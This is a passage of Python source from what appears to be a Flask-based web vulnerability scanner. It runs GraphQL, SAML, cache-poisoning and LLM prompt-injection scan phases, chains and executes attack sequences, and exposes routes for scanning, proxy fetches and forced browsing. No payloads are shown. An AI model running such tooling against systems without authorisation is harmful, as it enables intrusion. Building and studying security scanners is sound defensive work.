            _engine_progress["phase"] = "graphql"
            try:
                _gql_scanner = _GraphQLScanner(
                    target=target,
                    session=session,
                    stop_event=_engine_stop_event,
                    timeout=config.get("timeout", 10),
                )
                # Pass any sitemap URLs that look like GraphQL endpoints
                _gql_extra = [
                    u for u in sitemap.pages
                    if "graphql" in u.lower()
                ]
                _gql_hits = _gql_scanner.scan(extra_urls=_gql_extra or None)
                for _gf in _gql_hits:
                    _gf["agent"] = "GraphQL Scanner"
                    with _lock:
                        _findings.append(_gf)
                with _engine_lock:
                    _engine_progress["graphql_findings"] = len(_gql_hits)
                if _gql_hits:
                    log.info("[Engine] GraphQL: %d findings", len(_gql_hits))
            except Exception as _gql_err:
                log.debug("[Engine] GraphQL phase error: %s", _gql_err)

        # ── 5.11 SAML / OIDC / PKCE Security Testing ─────────────────────────
        if not _engine_stop_event.is_set() and _HAS_SAML and _phase_ok("saml"):
            _engine_status_msg = "testing SAML/OIDC/PKCE security"
            _engine_progress["phase"] = "saml"
            try:
                _known_wa = config.get("known_webauthn_endpoints")
                _saml_scanner = _SAMLScanner(
                    target=target,
                    session=session,
                    stop_event=_engine_stop_event,
                    timeout=config.get("timeout", 10),
                    # `or None` converts empty list [] to None so scanner uses discovery-only mode
                    known_acs_urls=config.get("known_acs_urls") or None,
                    known_webauthn_endpoints=[tuple(x) for x in _known_wa] if _known_wa else None,
                    saml_idp_url=config.get("saml_idp_url") or None,
                )
                _saml_hits = _saml_scanner.scan(sitemap_pages=sitemap.pages)
                for _sf in _saml_hits:
                    _sf["agent"] = "SAML Scanner"
                    with _lock:
                        _findings.append(_sf)
                with _engine_lock:
                    _engine_progress["saml_findings"] = len(_saml_hits)
                if _saml_hits:
                    log.info("[Engine] SAML: %d findings", len(_saml_hits))
            except Exception as _saml_err:
                log.debug("[Engine] SAML phase error: %s", _saml_err)

        # ── 5.12 Shadow API / Version Detection ───────────────────────────────
        if not _engine_stop_event.is_set() and _HAS_SHADOW_API and _phase_ok("shadow_api"):
            _engine_status_msg = "detecting shadow APIs and dead versions"
            _engine_progress["phase"] = "shadow_api"
            try:
                _shadow_scanner = _ShadowAPIScanner(
                    target=target,
                    session=session,
                    stop_event=_engine_stop_event,
                    timeout=config.get("timeout", 10),
                    extra_urls=_js_api_route_urls,
                )
                _shadow_hits = _shadow_scanner.scan(
                    discovered_urls=list(sitemap.pages.keys()))
                for _shf in _shadow_hits:
                    _shf["agent"] = "Shadow API Scanner"
                    with _lock:
                        _findings.append(_shf)
                with _engine_lock:
                    _engine_progress["shadow_api_findings"] = len(_shadow_hits)
                if _shadow_hits:
                    log.info("[Engine] Shadow API: %d findings", len(_shadow_hits))
            except Exception as _shadow_err:
                log.debug("[Engine] Shadow API phase error: %s", _shadow_err)

        # ── 5.13 Advanced Cache Poisoning ─────────────────────────────────────
        if not _engine_stop_event.is_set() and _HAS_CACHE_POISON and _phase_ok("cache_poison"):
            _engine_status_msg = "testing advanced cache poisoning"
            _engine_progress["phase"] = "cache_poison"
            try:
                _cp_scanner = _CachePoisoningScanner(
                    target=target,
                    session=session,
                    stop_event=_engine_stop_event,
                    timeout=config.get("timeout", 10),
                )
                _cp_hits = _cp_scanner.scan(urls=list(sitemap.pages.keys()))
                for _cpf in _cp_hits:
                    _cpf["agent"] = "Cache Poisoning Scanner"
                    with _lock:
                        _findings.append(_cpf)
                with _engine_lock:
                    _engine_progress["cache_poison_findings"] = len(_cp_hits)
                if _cp_hits:
                    log.info("[Engine] Cache Poisoning: %d findings", len(_cp_hits))
            except Exception as _cp_err:
                log.debug("[Engine] Cache Poisoning phase error: %s", _cp_err)

        # ── 5.14 LLM / AI Application Prompt Injection Testing ────────────────
        if not _engine_stop_event.is_set() and _HAS_LLM_SCANNER and _phase_ok("llm_scan"):
            _engine_status_msg = "scanning for LLM prompt injection vulnerabilities"
            _engine_progress["phase"] = "llm_scan"
            try:
                _llm_scanner = _LLMAppScanner(
                    target=target,
                    session=session,
                    stop_event=_engine_stop_event,
                    timeout=config.get("timeout", 10),
                )
                _llm_hits = _llm_scanner.scan(
                    discovered_urls=list(sitemap.pages.keys()))
                for _llmf in _llm_hits:
                    _llmf["agent"] = "LLM App Scanner"
                    with _lock:
                        _findings.append(_llmf)
                with _engine_lock:
                    _engine_progress["llm_scan_findings"] = len(_llm_hits)
                if _llm_hits:
                    log.info("[Engine] LLM Scanner: %d findings", len(_llm_hits))
            except Exception as _llm_err:
                log.debug("[Engine] LLM Scanner phase error: %s", _llm_err)

        # ── 6. External tools — wait for background thread ───────────────────
        if '_ext_bg_thread' in dir() and _ext_bg_thread.is_alive():
            _elog("PHASE external_tools WAITING for background thread")
            _engine_progress["phase"] = "external_tools"
            _engine_status_msg = "waiting for external tools to complete"
            _ext_bg_thread.join()
            _elog("PHASE external_tools DONE")

        # ── 7. Post-processing: confidence → dedup → vuln chaining ────────
        if not _engine_stop_event.is_set() and _phase_ok("post_processing"):
            _elog("PHASE post_processing START")
            _engine_status_msg = "post-processing findings"
            _engine_progress["phase"] = "post_processing"

            with _lock:
                all_findings = list(_findings)

            # ── Confidence scoring (with feedback loop) ──
            if _HAS_CONFIDENCE:
                try:
                    _anomaly = AnomalyScorer(_baseline) if (_HAS_ANOMALY and _HAS_BASELINE and _baseline) else None
                    _feedback_store = FeedbackStore() if _HAS_FEEDBACK_STORE else None
                    scorer = ConfidenceScorer(anomaly_scorer=_anomaly, feedback_store=_feedback_store)
                    for f in all_findings:
                        scorer.score_and_annotate(f)  # sets confidence_score, confidence_level, audit_confidence
                        # Classify anomaly score into human-readable label
                        if _anomaly and isinstance(f.get("anomaly_score"), (int, float)):
                            try:
                                f["anomaly_class"] = _anomaly.classify_anomaly(f["anomaly_score"])
                            except Exception:
                                pass
                except Exception as e:
                    log.debug("[Engine] Confidence scoring error: %s", e)

            # ── CVSS + OWASP enrichment ──
            if _HAS_CVSS_OWASP:
                try:
                    _cvss_owasp_enrich(all_findings)
                    with _engine_lock:
                        _engine_progress["cvss_owasp_enriched"] = True
                except Exception as e:
                    log.debug("[Engine] CVSS/OWASP enrichment error: %s", e)

            # ── Cross-layer confidence gate (Feature 6) ──
            try:
                with _lock:
                    _confidence_gate(_findings)
            except Exception as e:
                log.debug("[Engine] Confidence gate error: %s", e)

            # ── Deduplication ──
            if _HAS_DEDUP:
                try:
                    deduper = FindingDeduplicator()
                    deduped = deduper.deduplicate(all_findings)
                    with _lock:
                        _findings.clear()
                        _findings.extend(deduped)
                    with _engine_lock:
                        _engine_progress["findings_deduped"] = len(all_findings) - len(deduped)
                except Exception as e:
                    log.debug("[Engine] Dedup error: %s", e)

            # ── Vulnerability chaining ──
            if _HAS_VULN_CHAINER:
                try:
                    chainer  = VulnChainer()
                    # Pass LLM function if API key is available, else None
                    _llm_fn  = _llm_call if (_api_keys.get("openai") or _api_keys.get("anthropic")) else None
                    with _lock:
                        chains = chainer.analyze_and_annotate(_findings, llm_call=_llm_fn)
                    global _attack_chains
                    _attack_chains = [c.to_dict() for c in chains]
                    _attack_chains_mermaid = VulnChainer.chains_to_mermaid(chains)
                    for ch in _attack_chains:
                        ch["mermaid"] = _attack_chains_mermaid
                    _db_save_kv("attack_chains", _attack_chains)
                    with _engine_lock:
                        _engine_progress["attack_chains"] = len(chains)
                    log.info("[Engine] Vuln chaining: %d chains detected (%d rule-based + BFS)",
                             len(chains), sum(1 for c in chains if c.get("hop_depth", 1) == 1))
                except Exception as e:
                    log.debug("[Engine] Vuln chainer error: %s", e)

            # ── Multi-step attack chains (AttackOrchestrator) ──
            if _HAS_ATTACK_ORCHESTRATOR:
                try:
                    with _lock:
                        ao_findings = list(_findings)
                    ao = AttackOrchestrator(session=session, timeout=10)
                    sequences = ao.build_sequences(ao_findings)
                    chain_findings: list[dict] = []
                    for seq in sequences:
                        executed = ao.execute_sequence(seq)
                        if executed.completed or executed.result_summary:
                            chain_findings.append({
                                "vuln_type":  "attack_chain",
                                "severity":   "high",
                                "title":      executed.name,
                                "url":        ao_findings[0]["url"] if ao_findings else target,
                                "evidence":   executed.result_summary,
                                "category":   executed.category,
                                "sequence_id": executed.sequence_id,
                                "completed":  executed.completed,
                                "source":     "attack_orchestrator",
                            })
                    if chain_findings:
                        with _lock:
                            _findings.extend(chain_findings)
                    with _engine_lock:
                        _engine_progress["attack_chains_executed"] = len(sequences)
                    log.info("[Engine] AttackOrchestrator: %d sequences built, %d chain findings",
                             len(sequences), len(chain_findings))
                except Exception as e:
                    log.debug("[Engine] AttackOrchestrator error: %s", e)

            # ── Finding Correlation — root causes & systemic issues ──
            if _HAS_FINDING_CORRELATOR:
                try:
                    with _lock:
                        corr_input = list(_findings)
                    correlator = FindingCorrelator()
                    corr_groups = correlator.correlate(corr_input)
                    root_causes = correlator.get_root_causes(corr_groups)
                    systemic    = correlator.get_systemic_issues(corr_groups)
                    _db_save_kv("root_causes", root_causes)
                    _db_save_kv("systemic_issues", systemic)
                    with _engine_lock:
                        _engine_progress["correlation_groups"] = len(corr_groups)
                        _engine_progress["systemic_issues"]    = len(systemic)
                    log.info("[Engine] FindingCorrelator: %d groups, %d root causes, %d systemic",
                             len(corr_groups), len(root_causes), len(systemic))
                except Exception as e:
                    log.debug("[Engine] FindingCorrelator error: %s", e)

        # ── Final deduplication ──
        with _lock:
            pre_dedup = len(_findings)
            processed_findings, postprocess_summary = postprocess_findings(list(_findings))
            _findings[:] = processed_findings
            dedup_removed = postprocess_summary.get("duplicates_removed", pre_dedup - len(_findings))
        if dedup_removed > 0:
            log.info("[Engine] Dedup removed %d duplicate findings (%d → %d)",
                     dedup_removed, pre_dedup, len(_findings))
        with _engine_lock:
            _engine_progress["dedup_removed"] = dedup_removed
            _engine_progress["post_processing"] = postprocess_summary
            _engine_progress["findings_count"] = len(_findings)

        _engine_status_msg = "complete"
        _engine_progress["phase"] = "complete"
        try:
            if _active_scan_id:
                _db.record_metric(_active_scan_id, "complete",
                                  pages_crawled=_engine_progress.get("pages_crawled", 0),
                                  surfaces_found=_engine_progress.get("surfaces_found", 0),
                                  payloads_sent=_engine_progress.get("payloads_sent", 0),
                                  findings_count=len(_findings))
        except Exception:
            pass

    except Exception as exc:
        import traceback as _tb
        log.error("[Engine] Fatal error: %s\n%s", exc, _tb.format_exc())
        print(f"[ENGINE ERROR] {exc}\n{_tb.format_exc()}", flush=True)
        _engine_status_msg = f"error: {exc}"
        _engine_progress["phase"] = "error"
    finally:
        import datetime as _dt
        global _last_scan_summary
        _last_scan_summary = {
            "scan_id":       _active_scan_id,
            "target":        target,
            "phase_reached": _engine_progress.get("phase", "unknown"),
            "findings_count": _engine_progress.get("findings_count", len(_findings)),
            "pages_crawled": _engine_progress.get("pages_crawled", 0),
            "payloads_sent": _engine_progress.get("payloads_sent", 0),
            "tools_ran":     _engine_progress.get("tools_ran_last_scan", []),
            "ended_at":      _dt.datetime.utcnow().strftime("%H:%M UTC"),
        }
        _db_save_kv("last_scan_summary", _last_scan_summary)
        with _engine_lock:
            _engine_running = False
        # If agents are also done (or there are none), finalize the scan.
        # Guard with _scan_active so only one path (engine vs. last agent) runs this.
        global _scan_active
        with _lock:
            all_agents_done = not _agents or all(
                a["status"] in ("completed", "error", "stopped")
                for a in _agents.values()
            )
            if all_agents_done and _scan_active:
                _scan_active = False
                try:
                    if _active_scan_id:
                        _counts: dict = {}
                        for _f in _findings:
                            _s = (_f.get("severity") or "info").lower()
                            _counts[_s] = _counts.get(_s, 0) + 1
                        _summary = ", ".join(f"{v} {k}" for k, v in sorted(_counts.items()))
                        _db.update_scan_counts(
                            _active_scan_id,
                            finding_count=len(_findings),
                            critical_count=_counts.get("critical", 0),
                            high_count=_counts.get("high", 0),
                            medium_count=_counts.get("medium", 0),
                            low_count=_counts.get("low", 0),
                            info_count=_counts.get("info", 0),
                        )
                        _db.complete_scan(_active_scan_id, "completed", _summary)
                        _db.log_audit("scan_completed", scan_id=_active_scan_id,
                                      detail=f"findings={len(_findings)} summary={_summary}")
                        get_global_bus().publish(SCAN_COMPLETE, {
                            "scan_id": _active_scan_id,
                            "finding_count": len(_findings),
                            "target": target,
                        })
                        _fire_integrations_on_complete(_active_scan_id, list(_findings), target)
                except Exception:
                    pass


# ── Engine: Auth ──────────────────────────────────────────────────────────────

@app.route("/api/engine/auth", methods=["POST"])
@_login_required
def engine_auth():
    """Configure auth for the DAST engine. Supports form, bearer, basic, cookie, header."""
    if not _ENGINE_AVAILABLE:
        return jsonify({"error": "Engine modules not available"}), 503

    data = req.get_json(silent=True) or {}
    mode = data.get("mode", "none")

    global _engine_auth_handler
    handler = AuthHandler(timeout=15)

    try:
        if mode == "bearer":
            handler.set_bearer(data["token"])
            return jsonify({"success": True, "mode": "bearer", "info": handler.get_auth_summary()})

        elif mode == "basic":
            handler.set_basic(data["username"], data["password"])
            return jsonify({"success": True, "mode": "basic", "info": handler.get_auth_summary()})

        elif mode == "cookie":
            handler.set_cookie(data["name"], data["value"])
            return jsonify({"success": True, "mode": "cookie", "info": handler.get_auth_summary()})

        elif mode == "header":
            handler.set_header(data["header_name"], data["header_value"])
            return jsonify({"success": True, "mode": "header", "info": handler.get_auth_summary()})

        elif mode == "form":
            result = handler.form_login(data["login_url"], data["username"], data["password"])
            if result["success"]:
                with _engine_lock:
                    _engine_auth_handler = handler
                return jsonify({"success": True, "mode": "form", "info": handler.get_auth_summary(), "detail": result})
            else:
                return jsonify({"success": False, "mode": "form", "detail": result}), 401

        elif mode == "none":
            with _engine_lock:
                _engine_auth_handler = None
            return jsonify({"success": True, "mode": "none"})

        else:
            return jsonify({"error": f"Unknown auth mode: {mode}"}), 400

    except KeyError as ke:
        return jsonify({"error": f"Missing field: {ke}"}), 400


# ── Engine: Start scan ────────────────────────────────────────────────────────

@app.route("/api/engine/scan", methods=["POST"])
@_login_required
def engine_scan_start():
    """Start a full engine scan: crawl → fingerprint → fuzz."""
    global _engine_running, _engine_stop_event, _engine_thread
    global _engine_sitemap, _engine_fuzz_results, _engine_fingerprint
    global _engine_status_msg, _engine_progress

    if not _ENGINE_AVAILABLE:
        return jsonify({"error": "Engine modules not available"}), 503

    with _engine_lock:
        if _engine_running:
            return jsonify({"error": "Engine scan already running"}), 409

    data   = req.get_json(silent=True) or {}
    target = (data.get("target") or _scan_target or "").strip()
    if not target:
        return jsonify({"error": "target URL required"}), 400

    config = {
        "max_pages":    data.get("max_pages",   200),
        "max_depth":    data.get("max_depth",   5),
        "timeout":      data.get("timeout",     10),
        "delay":        data.get("delay",       0.05),
        "max_per_type": data.get("max_per_type", 8),
        "allow_dangerous_endpoints": bool(data.get("allow_dangerous_endpoints", False)),
    }

    # Reset state
    _engine_stop_event   = threading.Event()
    _engine_sitemap      = None
    _engine_fuzz_results = []
    _engine_fingerprint  = {}
    _engine_status_msg   = "starting"
    _engine_progress     = {
        "phase":               "starting",
        "pages_crawled":       0,
        "surfaces_found":      0,
        "payloads_sent":       0,
        "findings_count":      0,
        "passive_count":       0,
        "browse_count":        0,
        "detected_url":        None,
        "external_tools":      [],
        "external_status":     "",
        "nuclei_folder":       "",
        "nuclei_folders_done": 0,
        "nuclei_folders_total": 0,
        "current_tool":        "",
        "tools_ran_last_scan": [],
        "race_findings":       0,
        "race_tested":         0,
        "race_total":          0,
        "race_current_url":    "",
        "coverage_checks":     ["COV-REGISTRY-001"],
    }
    _engine_running = True

    _engine_thread = threading.Thread(
        target=_engine_scan_worker,
        args=(target, config),
        daemon=True,
        name="dast-engine",
    )
    _engine_thread.start()

    return jsonify({"success": True, "target": target, "status": "started"})


# ── Engine: Stop scan ─────────────────────────────────────────────────────────

@app.route("/api/engine/stop", methods=["POST"])
@_login_required
def engine_scan_stop():
    """Signal the engine scan to stop gracefully."""
    _engine_stop_event.set()
    return jsonify({"success": True, "message": "Stop signal sent"})


# ── Engine: Status ────────────────────────────────────────────────────────────

@app.route("/api/engine/status")
@_login_required
def engine_status():
    """Return current engine scan progress."""
    with _engine_lock:
        return jsonify({
            "running":   _engine_running,
            "status":    _engine_status_msg,
            "progress":  _engine_progress,
            "engine_available": _ENGINE_AVAILABLE,
            "auth": _engine_auth_handler.get_auth_summary() if _engine_auth_handler else None,
            "capabilities": {
                "attack_orchestrator": _HAS_ATTACK_ORCHESTRATOR,
                "auth_probes":         _HAS_AUTH_PROBES,
                "feedback_store":      _HAS_FEEDBACK_STORE,
                "finding_correlator":  _HAS_FINDING_CORRELATOR,
                "html_report":         _HAS_HTML_REPORT,
                "codec":               _HAS_CODEC,
                "macro_reauth":        _engine_macro_script is not None,
                "cookie_rules":        len(_engine_cookie_rules) > 0,
            },
        })


# ── Engine: Site map ──────────────────────────────────────────────────────────

@app.route("/api/engine/sitemap")
@_login_required
def engine_sitemap():
    """Return the crawled site map (pages + input surfaces)."""
    with _engine_lock:
        if _engine_sitemap is None:
            return jsonify({"pages": [], "surfaces": [], "tech": {}, "stats": {"pages": 0, "surfaces": 0}})
        return jsonify(_engine_sitemap.to_dict())


# ── Engine: Fingerprint ───────────────────────────────────────────────────────

@app.route("/api/engine/fingerprint")
@_login_required
def engine_fingerprint_result():
    """Return technology fingerprint for the scanned target."""
    with _engine_lock:
        fp = _engine_fingerprint
    if not fp:
        return jsonify({"error": "No fingerprint yet — run an engine scan first"}), 404
    return jsonify({
        "fingerprint": fp,
        "summary": fingerprint_summary(fp) if _ENGINE_AVAILABLE else "",
    })


# ── Engine: Findings ──────────────────────────────────────────────────────────

@app.route("/api/engine/findings")
@_login_required
def engine_findings():
    """Return all findings from the engine fuzzer."""
    with _engine_lock:
        results = list(_engine_fuzz_results)
    results = _apply_findings_filter(results, {
        "severity":      req.args.get("severity"),
        "vuln_type":     req.args.get("vuln_type"),
        "status_code":   req.args.get("status_code"),
        "url_contains":  req.args.get("url_contains"),
        "param":         req.args.get("param"),
        "agent":         req.args.get("agent"),
        "min_confidence": req.args.get("min_confidence"),
    })
    return jsonify({"findings": results, "count": len(results)})


# ── Evidence viewer ───────────────────────────────────────────────────────────

@app.route("/api/evidence/<eid>")
@_login_required
def get_evidence(eid: str):
    """Return full HTTP request/response evidence for a finding."""
    if not _ENGINE_AVAILABLE:
        return jsonify({"error": "Engine modules not available"}), 503
    ev = _ev_store.get(eid)
    if ev is None:
        return jsonify({"error": f"Evidence ID {eid!r} not found"}), 404
    return jsonify({
        "id":            ev.id,
        "url":           ev.url,
        "method":        ev.method,
        "vuln_type":     ev.vuln_type,
        "payload":       ev.payload,
        "parameter":     ev.parameter,
        "resp_time_ms":  ev.resp_time_ms,
        "ts":            ev.ts,
        "request": {
            "headers": ev.req_headers,
            "body":    ev.req_body,
        },
        "response": {
            "status":  ev.status_code,
            "headers": ev.resp_headers,
            "body":    ev.resp_body[:4096],
        },
    })


# ── Evidence: list all ────────────────────────────────────────────────────────

@app.route("/api/evidence")
@_login_required
def list_evidence():
    """Return summary list of all captured evidence entries."""
    if not _ENGINE_AVAILABLE:
        return jsonify({"evidence": [], "count": 0})
    entries = _ev_store.all()   # returns list[dict]
    return jsonify({
        "evidence": [
            {
                "id":           e["id"],
                "url":          e["url"],
                "method":       e["method"],
                "vuln_type":    e["vuln_type"],
                "parameter":    e["parameter"],
                "resp_time_ms": e["resp_time_ms"],
                "ts":           e["ts"],
            }
            for e in entries
        ],
        "count": len(entries),
    })


@app.route("/api/fetch-target", methods=["POST"])
@_login_required
def fetch_target():
    """Proxy-fetch a target URL using the scan session and return full request/response."""
    data   = req.get_json(silent=True) or {}
    url    = (data.get("url") or "").strip()
    method = (data.get("method") or "GET").upper()
    if not url:
        return jsonify({"error": "url required"}), 400
    try:
        import time as _time
        import requests as _req_ft
        # Use the live scan session if available (carries auth headers), else a fresh one
        sess = _engine_auth_handler.session if _engine_auth_handler else _req_ft.Session()
        sess.verify = False
        from urllib.parse import urlparse as _up
        import re as _re

        t0   = _time.time()
        # Follow redirects so we land on the actual page, not a 307 stub
        resp = sess.request(method, url, timeout=10, allow_redirects=True)
        elapsed_ms = round((_time.time() - t0) * 1000)

        # Build a proper raw HTTP request (Burp-style) from the final request in the chain
        final_req  = resp.request
        parsed     = _up(final_req.url)
        host       = parsed.netloc
        path       = (parsed.path or "/") + (f"?{parsed.query}" if parsed.query else "")

        req_line   = f"{final_req.method} {path} HTTP/1.1"

        # Always put Host first (requests keeps it in headers but position varies)
        headers_dict = dict(final_req.headers)
        headers_dict.pop("Host", None)   # remove so we can place it first
        headers_lines = [f"Host: {host}"] + [f"{k}: {v}" for k, v in headers_dict.items()]
        req_hdrs   = "\n".join(headers_lines)

        req_body   = ""
        if final_req.body:
            req_body = final_req.body if isinstance(final_req.body, str) \
                       else final_req.body.decode("utf-8", errors="replace")

        request_text = req_line + "\n" + req_hdrs
        if req_body:
            request_text += "\n\n" + req_body

        # Build a proper raw HTTP response
        status_line   = f"HTTP/1.1 {resp.status_code} {resp.reason or ''}"
        resp_hdrs_str = "\n".join(f"{k}: {v}" for k, v in resp.headers.items())
        try:
            resp_body = resp.text[:8000]
        except Exception:
            resp_body = resp.content[:8000].decode("utf-8", errors="replace")
        response_text = f"{status_line}\n{resp_hdrs_str}\n\n{resp_body}"

        # Extract a proof snippet — first matching line containing the vector keyword
        proof_snippet = ""
        keywords = data.get("keywords", [])
        if keywords:
            for line in resp_body.splitlines():
                if any(k.lower() in line.lower() for k in keywords):
                    proof_snippet = line.strip()[:200]
                    break

        return jsonify({
            "url":           resp.url,
            "method":        method,
            "status_code":   resp.status_code,
            "elapsed_ms":    elapsed_ms,
            "request":       request_text,
            "response":      response_text,
            "proof_snippet": proof_snippet,
        })
    except Exception as exc:
        return jsonify({"error": str(exc)}), 500


# ═══════════════════════════════════════════════════════════════════════════════
# ██  PASSIVE SCANNER ROUTES
# ═══════════════════════════════════════════════════════════════════════════════

@app.route("/api/passive/findings")
@_login_required
def passive_findings():
    """Return all passive scan findings (no payload needed — headers/cookies/info)."""
    with _engine_lock:
        pfindings = list(_passive_findings)
    pfindings = _apply_findings_filter(pfindings, {
        "severity":      req.args.get("severity"),
        "vuln_type":     req.args.get("vuln_type"),
        "status_code":   req.args.get("status_code"),
        "url_contains":  req.args.get("url_contains"),
        "param":         req.args.get("param"),
        "agent":         req.args.get("agent"),
        "min_confidence": req.args.get("min_confidence"),
    })
    return jsonify({"findings": pfindings, "count": len(pfindings)})


@app.route("/api/passive/scan", methods=["POST"])
@_login_required
def passive_scan_url():
    """Passively scan target + all already-crawled pages. No fuzzing."""
    global _passive_findings
    if not _ENGINE_AVAILABLE:
        return jsonify({"error": "Engine not available"}), 503

    data   = req.get_json(silent=True) or {}
    target = (data.get("target") or data.get("url") or _scan_target or "").strip()
    if not target:
        return jsonify({"error": "target required — enter a URL in the scan bar"}), 400

    # Auto-resolve scheme/port
    target = _resolve_target(target)

    import urllib3 as _u3
    _u3.disable_warnings(_u3.exceptions.InsecureRequestWarning)
    s = PassiveInterceptSession()
    s.verify = False
    s.headers["User-Agent"] = "Mozilla/5.0 (DAST-Passive/2.0)"

    # Build URL list: target + all pages from engine sitemap (if already crawled)
    urls_to_scan: list[str] = [target]
    with _engine_lock:
        if _engine_sitemap:
            sitemap_urls = list(_engine_sitemap.pages.keys())
            # Exclude noise (assets, fonts, JS bundles) — focus on HTML + API endpoints
            for u in sitemap_urls:
                ext = u.rsplit(".", 1)[-1].lower().split("?")[0]
                if ext not in ("js", "css", "png", "jpg", "jpeg", "gif", "ico",
                               "svg", "woff", "woff2", "ttf", "eot", "map"):
                    if u not in urls_to_scan:
                        urls_to_scan.append(u)
        # Also add common paths not yet crawled
        common = ["/robots.txt", "/sitemap.xml", "/.well-known/security.txt",
                  "/api", "/swagger.json", "/openapi.json", "/api-docs"]
        for path in common:
            u = target.rstrip("/") + path
            if u not in urls_to_scan:
                urls_to_scan.append(u)

    # Cap at 50 pages for on-demand scan
    urls_to_scan = urls_to_scan[:50]

    all_findings: list = []
    for url in urls_to_scan:
        try:
            r = s.get(url, timeout=8, allow_redirects=True)
            pf = _passive.scan(
                url=url, status_code=r.status_code,
                resp_headers=dict(r.headers),
                resp_body=r.text[:8000],
                cookies={c.name: c.value for c in s.cookies},
                request_headers=dict(s.headers),
            )
            all_findings.extend(pf)
        except Exception:
            continue

    # Persist so /api/passive/findings returns results
    with _engine_lock:
        _passive_findings = [f.to_dict() for f in all_findings]

    _log_activity("passive_scan", target,
                  f"{len(all_findings)} findings across {len(urls_to_scan)} pages")

    return jsonify({
        "findings_count": len(all_findings),
        "urls_scanned":   len(urls_to_scan),
        "findings":       [f.to_dict() for f in all_findings[:20]],
    })


# ═══════════════════════════════════════════════════════════════════════════════
# ██  OPENAPI IMPORT ROUTES
# ═══════════════════════════════════════════════════════════════════════════════

@app.route("/api/engine/import/openapi", methods=["POST"])
@_login_required
def engine_openapi_import():
    """
    Import an OpenAPI/Swagger spec and populate the engine's attack surface.
    Body: {source: "URL | file path | raw JSON string", base_url: "optional override"}
    """
    if not _ENGINE_AVAILABLE:
        return jsonify({"error": "Engine not available"}), 503

    global _openapi_surfaces
    data     = req.get_json(silent=True) or {}
    source   = data.get("source", "").strip()
    base_url = data.get("base_url", "").strip()

    if not source:
        return jsonify({"error": "source required (URL, file path, or raw JSON)"}), 400

    try:
        surfaces = import_openapi(source, base_url=base_url)
        with _engine_lock:
            _openapi_surfaces = [
                {"url": s.url, "method": s.method, "param": s.param,
                 "type": s.param_type, "value": s.original_value,
                 "content_type": s.content_type}
                for s in surfaces
            ]
            # Also merge into live sitemap if available
            if _engine_sitemap is not None:
                for s in surfaces:
                    _engine_sitemap.add_surface(s)
        return jsonify({
            "success":  True,
            "surfaces": len(surfaces),
            "preview":  _openapi_surfaces[:10],
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 400


@app.route("/api/engine/import/openapi/surfaces")
@_login_required
def openapi_surfaces():
    """Return all surfaces imported from OpenAPI spec."""
    with _engine_lock:
        surfs = list(_openapi_surfaces)
    return jsonify({"surfaces": surfs, "count": len(surfs)})


# ═══════════════════════════════════════════════════════════════════════════════
# ██  FORCED BROWSE ROUTES
# ═══════════════════════════════════════════════════════════════════════════════

def _unique_wordlist_paths(paths: list[str]) -> list[str]:
    seen: set[str] = set()
    unique: list[str] = []
    for raw in paths:
        path = str(raw or "").strip()
        if path and path not in seen:
            seen.add(path)
            unique.append(path)
    return unique


def _prepare_forcebrowse_wordlist(wordlist: str, categories: list, extra: list) -> tuple[dict, int, str]:
    extra_paths = _unique_wordlist_paths(extra or [])
    category_names = [str(c).strip() for c in (categories or []) if str(c).strip()]
    if category_names:
        paths = load_multiple_wordlists(*category_names) + extra_paths
        label = ", ".join(category_names)
    else:
        label = (wordlist or "common").strip() or "common"
        paths = load_wordlist(label) + extra_paths
    paths = _unique_wordlist_paths(paths)
    return {"wordlist_name": "", "extra_wordlist": paths}, len(paths), label


@app.route("/api/engine/forcebrowse", methods=["POST"])
@_login_required
def forcebrowse_start():
    """Start a forced browse scan (DirBuster-style). Body: {target, extra_wordlist: [...]}"""
    global _browse_running, _browse_stop_event, _browse_thread, _browse_results
    global _browse_wordlist_total, _browse_wordlist_label, _browse_status

    if not _ENGINE_AVAILABLE:
        return jsonify({"error": "Engine not available"}), 503

    with _engine_lock:
        if _browse_running:
            return jsonify({"error": "Forced browse already running"}), 409

    data   = req.get_json(silent=True) or {}
    target = (data.get("target") or _scan_target or "").strip()
    if not target:
        return jsonify({"error": "target required"}), 400

    extra       = data.get("extra_wordlist", [])
    wordlist    = data.get("wordlist", "common")       # category name or file path
    categories  = data.get("wordlist_categories", [])  # list of category names to merge
    fb_kwargs, wordlist_size, wordlist_label = _prepare_forcebrowse_wordlist(
        wordlist, categories, extra
    )

    _browse_stop_event = threading.Event()
    _browse_results    = []
    _browse_running    = True
    _browse_wordlist_total = wordlist_size
    _browse_wordlist_label = wordlist_label
    _browse_status     = f"queued - {wordlist_size} paths scheduled"

    def _browse_worker():
        global _browse_running, _browse_results, _browse_status
        _browse_status = f"running - {wordlist_size} paths scheduled"
        try:
            sess = PassiveInterceptSession(); sess.verify = False
            sess.headers["User-Agent"] = "Mozilla/5.0 (DAST-ForcedBrowse/2.0)"

            def _cb(result):
                with _engine_lock:
                    _browse_results.append(result.to_dict())

            fb = ForcedBrowser(
                base_url       = target,
                session        = sess,
                workers        = data.get("workers", 15),
                timeout        = data.get("timeout", 8),
                stop_event     = _browse_stop_event,
                callback       = _cb,
                **fb_kwargs,
            )
            fb.run()
            with _engine_lock:
                _browse_status = f"complete - {len(_browse_results)} paths found from {wordlist_size} candidates"
        except Exception as e:
            log.error("[Browse] worker exception: %s", e)
            _browse_status = f"error: {e}"
        finally:
            with _engine_lock:
                _browse_running = False

    _browse_thread = threading.Thread(target=_browse_worker, daemon=True, name="dast-forcebrowse")
    _browse_thread.start()
    return jsonify({
        "success":       True,
        "target":        target,
        "wordlist":      wordlist_label,
        "wordlist_size": wordlist_size,
        "count_unit":    "paths",
        "count_label":   f"{wordlist_size} paths scheduled",
    })


@app.route("/api/engine/forcebrowse/stop", methods=["POST"])
@_login_required
def forcebrowse_stop():
    _browse_stop_event.set()
    return jsonify({"success": True})


@app.route("/api/engine/forcebrowse/results")
@_login_required
def forcebrowse_results():
    with _engine_lock:
        results     = list(_browse_results)
        running     = _browse_running
        word_total  = _browse_wordlist_total
        word_label  = _browse_wordlist_label
        gb_findings = list(_gobuster_findings)
        gb_running  = _gobuster_running
    return jsonify({
        "results":          results,
        "count":            len(results),
        "count_unit":       "paths",
        "wordlist":         word_label,
        "wordlist_size":    word_total,
        "running":          running,
        "status":           _browse_status,
        "gobuster_running": gb_running,
        "gobuster_status":  _gobuster_status,
        "gobuster_paths":   gb_findings,
        "gobuster_count":   len(gb_findings),
    })


@app.route("/api/engine/wordlists")
@_login_required
def wordlists_list():
    """List available wordlist categories with path counts."""
